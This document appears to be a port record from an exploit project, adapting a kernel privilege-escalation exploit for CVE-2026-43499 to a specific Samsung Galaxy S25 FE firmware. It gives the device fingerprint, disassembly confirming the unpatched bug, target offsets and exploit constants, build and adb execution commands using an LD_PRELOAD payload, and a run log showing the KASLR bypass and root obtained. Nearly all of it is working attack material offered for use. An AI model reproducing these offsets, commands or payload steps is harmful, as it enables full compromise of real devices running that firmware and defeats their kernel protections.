# Galaxy S25 FE SM-S731B / S731BXXS9BZH1 port record

This record documents the port of CVE-2026-43499 to the Galaxy S25 FE
International variant (`SM-S731B`, firmware `S731BXXS9BZH1`, region OXM/EUY).

Unlike a normal port, this one required no new offsets. The `S731BXXS9BZH1`
and `S731U1UES7BZF3` `r13s` kernels are the **same binary**, rebuilt only to
change the version string. The profile was still derived from the BZH1 Image
rather than copied, and the result is confirmed on hardware.

## Device identity

| Field | Value |
| --- | --- |
| Model | `SM-S731B` |
| Codename | `r13s` (product `r13sxxx`) |
| SoC | Exynos 2400 (Samsung, `s5e9945`) |
| Display build | `BP4A.251205.006.S731BXXS9BZH1` |
| Build fingerprint | `samsung/r13sxxx/r13s:16/BP4A.251205.006/S731BXXS9BZH1_OXM9BZH1:user/release-keys` |
| Kernel release | `6.1.157-android14-11` |
| Kernel build | `#1 SMP PREEMPT Fri Aug 14 08:27:18 UTC 2026` |
| Android SDK | 36 (Android 16) |
| Security patch | `2026-08-05` |
| Page size | 4096 |
| Region / CSC | `EUY` / OXM |
| ADB serial | `R5CYA0Q7AYL` |

## Why this port was trivial: the kernel is identical

The BZH1 boot image was extracted from the AP package and its raw ARM64 Image
compared against the BZF3 reference. All three artifacts are byte-for-byte the
same size:

| Object | BZF3 (U1) | BZH1 (B) |
| --- | --- | --- |
| `boot.img` | 67,108,864 | 67,108,864 |
| raw kernel Image | 38,832,640 | 38,832,640 |
| `vmlinux.elf` | 44,366,383 | 44,366,383 |

BZH1 raw kernel SHA-256:
`2E852CD5BA6A9E39E3B3AFB6D4764EB13B527EDF7CBB078BB4C9EC9BAA977BDD`

Every compared symbol offset matches the BZF3 profile exactly (18 of 18
comparable defines, plus `nfulnl_logger`, `ashmem_mutex`, `ashmem_shrinker`),
`SLIDE_TRACEFS_WORKER_CALLER_OFF` is `0x000dbd9c` in both, and the 32-row P0
fingerprint is byte-identical. The kernel build string is the same
`6.1.157-android14-11` with no extra suffix, so the KernelSU `vermagic` also
matches.

Samsung shipped an identical `r13s` kernel for both the U1 and B variants and
changed only the version string.

## CVE-2026-43499 is unpatched in BZH1

BZH1's kernel was built Aug 14, 2026 — three months after the upstream GhostLock
fix and its `CVE-2026-53166` follow-up. Because the kernel is byte-identical to
the device-tested BZF3 build (Jun 11, 2026), the vulnerability status is
identical too. This was confirmed directly rather than inferred, by
disassembling `remove_waiter()` in the recovered BZH1 ELF.

The **patched** form introduced by the upstream fix reads the owning task out of
`waiter->task` and scrubs `waiter_task->pi_blocked_on`. BZH1 instead contains the
**unpatched** form:

```text
ffffffc0091207e0: f904aa9f   str xzr, [x20, #0x950]   ; current->pi_blocked_on = NULL
...
ffffffc009120950: 9400015c   bl  rt_mutex_adjust_prio_chain
```

`x20` is `current` (from `mrs x20, SP_EL0` at `+0x3c`), and the final chain walk
passes `x5 = x20` (`current`). `remove_waiter()` never reads `waiter->task` at
offset `0x30` — the only `#0x30` accesses in the function are stack slots and an
`rt_mutex_waiter` field inside the chain-walk loop. The function therefore still
scrubs the wrong task on the requeue-PI proxy rollback path, which is exactly the
GhostLock primitive.

## Target profile: `r13s-S731BXXS9BZH1`

Profile resides at `src/targets/r13s-S731BXXS9BZH1/target.h`. Its only
differences from the BZF3 profile are identity strings:

```text
BUILD_VARIANT_LABEL  r13s-S731BXXS9BZH1-app-production-slide8-fops8
BUILD_VARIANT_LABEL  r13s-S731BXXS9BZH1-root-umh
BUILD_FINGERPRINT    samsung/r13sxxx/r13s:16/BP4A.251205.006/S731BXXS9BZH1_OXM9BZH1:user/release-keys
P0_FINGERPRINT_HEADER targets/r13s-S731BXXS9BZH1/p0_fingerprint.h
```

All memory-map, offset, tuning, and exploit-shape constants are re-derived from
the BZH1 Image and are identical to the BZF3 values:

| Parameter | Value |
| --- | --- |
| `P0_PAGE_OFFSET` | `0xffffff8000000000` |
| `P0_PHYS_OFFSET` / `P0_KERNEL_PHYS_LOAD` | `0x80000000` |
| `KIMAGE_TEXT_BASE` | `0xffffffc008000000` |
| `SLIDE_TRACEFS_EVENT_ID` | 106 |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | `0x000dbd9c` |
| `SLIDE_PSELECT_WORD_SHIFT` | 3 |
| `APP_KERNEL_PAGE_KSNITCH_IDENTITY_END` | `0xffffff8080000000` |
| `APP_RECLAIM_MAX_DIRECT_BASE` | `0xffffff8080000000` |
| `DEFAULT_EXPLOIT_ATTEMPTS` | 1 |
| `APP_REQUIRE_FRESH_P0_SESSION` | 1 |
| `MM_STRUCT_SZ` / `MM_ORDER` | `0x400` / 3 |

`SLIDE_TRACEFS_EVENT_ID` was independently confirmed on-device as `106` via
`/sys/kernel/tracing/events/sched/sched_blocked_reason/id`.

The checked-in fingerprint was generated with:

```sh
perl tools/generate_p0_fingerprint.pl kernel 0x1f0000 \
  src/targets/r13s-S731BXXS9BZH1/p0_fingerprint.h
```

## KernelSU

The KernelSU module is the same `r13s` 6.1 no-patch-text Samsung KDP/RKP/DEFEX
build already validated for BZF3. Its `vermagic` is an exact match for BZH1:

```text
6.1.157-android14-11 SMP preempt mod_unload modversions aarch64
```

The manual-relocation audit was run against the recovered BZH1 `vmlinux.elf` and
BZH1-derived `Module.symvers`:

```sh
python3 kernelsu/tools/extract_target_symvers.py vmlinux.elf Module.symvers
python3 kernelsu/tools/audit_module_against_target.py \
  kernelsu/android14-6.1_kernelsu-r13s-S731BXXS9BZH1-kdp.ko \
  vmlinux.elf Module.symvers --manual-relocation
```

Result:

```text
undefined symbols: 202
module version entries: 0
missing from target symbol table: 0
symbols resolved from kallsyms rather than target exports: 47
undefined symbols intentionally without module CRC: 202
target CRC mismatches: 0
```

The module was republished under BZH1 names. Because the kernel is identical,
the module and `ksud` bytes are the same as the BZF3 pair.

## Hardware validation

The payload was executed on `SM-S731B` / `R5CYA0Q7AYL` on 2026-10-03 via the
documented LD_PRELOAD route:

```sh
adb shell "EXPLOIT_ATTEMPT_TIMEOUT_SEC=2200 \
  CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499-app.so /system/bin/id"
```

The chain completed on the first attempt:

```text
[+] build config label=r13s-S731BXXS9BZH1-app-production-slide8-fops8 stack_writer=pselect
[+] slide-kaslr-ok source=physical base=ffffffc008060000 slide=0000000000060000 data_mode=physical-alias
[+] p0 fingerprint changed=1 best=8 second=0 source_offset=00060000
[+] fops data alias changed=1 exact=1 target=ffffff80024e4c30 observed=ffffff8042609000 expected=ffffff8042609000 match=1
[+] phys step probed read done ok=1 idx=225
[+] root umh queued ... wake=1 complete=1 retval=0 socket=1
[+] root umh selinux left=0 intended root state old=1
[+] pipe physrw done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
[+] exploit completed attempt=1/1
```

The KASLR slide resolved as `0x00060000`, the fops data alias verified, the pipe
physrw primitive was established, and the UMH root daemon started as uid 0.

Note that the final `id` in that command still reports `uid=2000(shell)`: the
`LD_PRELOAD`ed binary is the shell process, and root is delivered by the separate
UMH daemon. Root is verified through the helper's client mode:

```sh
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
```

KernelSU late-load follows the standard flow (`--ephemeral --allow-shell`):

```sh
adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
```

### Known post-exploit diagnostics

The run logs benign `diag page-struct gate/probe read failed` and
`pipe-repair: PARTIAL` messages. These come from the post-exploit stability
repair path and are the pre-existing soft-reboot investigation on this branch,
not a BZH1-specific defect.

## Build

```sh
ANDROID_NDK_HOME=/path/to/android-ndk-r27 make TARGET=r13s-S731BXXS9BZH1
```

Verified with NDK `27.0.12077973`, API 35.

## Artifacts

| File | Size | SHA-256 |
| --- | ---: | --- |
| `artifacts/r13s-S731BXXS9BZH1/cve-2026-43499-app.so` | 151,928 | `b304baf83daca9d7ba29b2606cd735d26c8a6bce17c991d0d32f96f65e00b79f` |
| `artifacts/r13s-S731BXXS9BZH1/cve-2026-43499-root` | 26,960 | `1d5750239bc0c8db5040183af00cbd90f4fe9114d8e1581de77237da6f5cbf63` |
| `kernelsu/android14-6.1_kernelsu-r13s-S731BXXS9BZH1-kdp.ko` | 398,336 | `824f2af93a5d520ace0dd13f4f0cf8c1cc7b985b81872fa7fc5b194c6cbb1698` |
| `kernelsu/ksud-r13s-S731BXXS9BZH1-kdp` | 3,607,184 | `cad53d0ddea50299afd169614cedb05f81ecad51d8278b0f37579495b34b7a8e` |

The published `cve-2026-43499-app.so` is the plain `APP_PRELOAD` output, matching
the BZF3 publication convention (not the size-pinned `release` target).

## Notes

- The exploit requires a fresh boot per attempt series
  (`APP_REQUIRE_FRESH_P0_SESSION=1`) and a quiet window after boot.
- MTE is active on this SoC; the profile sets `KERNELSNITCH_MTE_ENABLED=1`.
- Root is per-boot; no boot image was modified.
- Because the kernel binary is shared with BZF3, any future `r13s` tuning change
  applies to both profiles.
